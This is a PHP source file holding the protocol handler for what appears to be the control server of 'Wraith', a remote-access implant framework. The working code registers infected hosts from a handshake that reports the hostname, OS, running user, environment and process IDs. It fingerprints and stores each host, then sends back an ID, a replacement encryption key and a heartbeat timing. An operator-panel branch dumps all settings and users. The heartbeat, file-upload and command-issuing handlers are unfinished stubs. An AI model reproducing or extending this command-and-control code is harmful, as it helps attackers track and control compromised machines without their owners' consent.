<?php

// Create protocol handler for protocol v0
// Each handler must follow the naming format: Handler_proto_v_{version}
class Handler_proto_v_0 {

    // Handler properties
    private $dbm; // Copy of the database manager instance
    private $cType; // Who the request is from
    private $cAddress; // The IP address of the client
    private $cData; // The data to be processed
    private $response = []; // The response dict sent when responding

    function __construct($dbm, $clientType, $clientAddress, $clientData) {

        // Copy args to private properties
        $this->dbm = $dbm;
        $this->cType = $clientType;
        $this->cAddress = $clientAddress;
        $this->cData = $clientData;

    }

    function __destruct() {

        // When the handler is destroyed (API script is about to end)

        // Respond
        respond($this->response);

    }

    function handleRequest() {

        // If the handler was created, the client has passed all checks
        // so it is safe to add the API fingerprint to the response
        $this->response["APIFingerprint"] = $this->dbm->dbGetSettings(["key" => ["APIFingerprint"]])["APIFingerprint"];

        // Determine if the client is a manager or Wraith
        if ($this->cType === "wraith") {

            // Wraith

            // Wraith is logging in
            if ($this->cData["reqType"] === "handshake") {

                // TODO create wraith join event

                // Ensure that the required fields are present in the request
                if (
                    !hasKeys($this->cData, [
                        "hostInfo",
                        "wraithInfo",
                    ]) ||
                    !hasKeys($this->cData["hostInfo"], [
                        "arch",
                        "hostname",
                        "osType",
                        "osVersion",
                        "reportedIP",
                    ]) ||
                    !hasKeys($this->cData["wraithInfo"], [
                        "version",
                        "startTime",
                        "plugins",
                        "env",
                        "pid",
                        "ppid",
                        "runningUser",
                    ])
                ) {

                    $this->response["status"] = "ERROR";
                    $this->response["message"] = "missing required headers";

                    return;

                }

                // Add the connecting IP to the host info array
                $this->cData["hostInfo"]["connectingIP"] = getClientIP();
                // Add a generated fingerprint to the host info array
                $this->cData["hostInfo"]["fingerprint"] = genWraithFingerprint([
                    // The fingerprint is made up of host data which is unlikely to change
                    $this->cData["hostInfo"]["arch"],
                    $this->cData["hostInfo"]["hostname"],
                    $this->cData["hostInfo"]["osType"],
                    $this->cData["wraithInfo"]["runningUser"],
                ]);

                // Generate and ID for the Wraith
                $newWraithUniqueID = uniqid();

                // Create a database entry for the Wraith
                $this->dbm->dbAddWraith([
                    "assignedID" => $newWraithUniqueID,
                    "hostProperties" => json_encode($this->cData["hostInfo"]),
                    "wraithProperties" => json_encode($this->cData["wraithInfo"]),
                    "lastHeartbeatTime" => time(),
                    "issuedCommands" => json_encode([]),
                ]);

                // Return a successful status and message
                $this->response["status"] = "SUCCESS";
                $this->response["message"] = "handshake successful";

                // Add an encryption key switch command to switch to a
                // more secure, non-hard-coded encryption key
                $this->response["switchKey"] = $this->dbm->dbGetSettings(["key" => ["wraithSwitchCryptKey"]])["wraithSwitchCryptKey"];

                // Let the Wraith know what ID it was assigned so it can reference it in heartbeats
                $this->response["assignedID"] = $newWraithUniqueID;

                // Let the Wraith know how often to send heartbeats. This is the Wraith mark dead delay
                // divided by 2.5 and rounded *down* to the nearest integer
                $this->response["baseHeartbeatDelay"] = floor($this->dbm->dbGetSettings(["key" => ["wraithMarkOfflineDelay"]])["wraithMarkOfflineDelay"]/2.5);

                // Respond
                return;

            // Wraith is sending heartbeat
            } else if ($this->cData["reqType"] === "heartbeat") {

                    // TODO

            // Wraith is uploading a file
            } else if ($this->cData["reqType"] === "upload") {

                    // TODO

            // Unrecognised request type
            } else {

                $this->response["status"] = "ERROR";
                $this->response["message"] = "request type not implemented in protocol";
                return;

            }

        } else if ($this->cType === "manager") {

            // Manager

            // Update the session last heartbeat time
            $this->dbm->dbUpdateSessionLastHeartbeat($this->cData["sessionID"]);

            // The panel is requesting general information
            if ($this->cData["reqType"] === "fetchInfo") {

                // Get necessary variables
                $sessionID = $this->cData["sessionID"];
                $session = $this->dbm->dbGetSessions(["assignedID" => [$sessionID]])[$sessionID];

                $this->response["data"] = [
                    "APIVersion" => constant("API_VERSION"),
                    "sessionUsername" => $session["username"],
                    "activeWraiths" => sizeof($this->dbm->dbGetWraiths()),
                    // The following is a lot of information disclosure if someone
                    // unauthenticated is able to fetch it. Be careful!
                    "settings" => $this->dbm->dbGetSettings(),
                    "users" => $this->dbm->dbGetUsers(),
                ];
                $this->response["status"] = "SUCCESS";
                return;

            // The manager in issuing a Wraith command
            } else if ($this->cData["reqType"] === "issueCommand") {

                // TODO

            // Unrecognised request type
            } else {

                $this->response["status"] = "ERROR";
                $this->response["message"] = "request type not implemented in protocol";
                return;

            }

        } else {

            // This will never happen if the code is unmodified. However, to gracefully
            // handle mistakes in modification, this should stay here
            $this->response["status"] = "ERROR";
            $this->response["message"] = "the request was identified but methods for handling it were not implemented in this protocol version";
            return;

        }

    }

}

// Add the protocol name to the array of supported protocols
array_push($SUPPORTED_PROTOCOL_VERSIONS, "0");
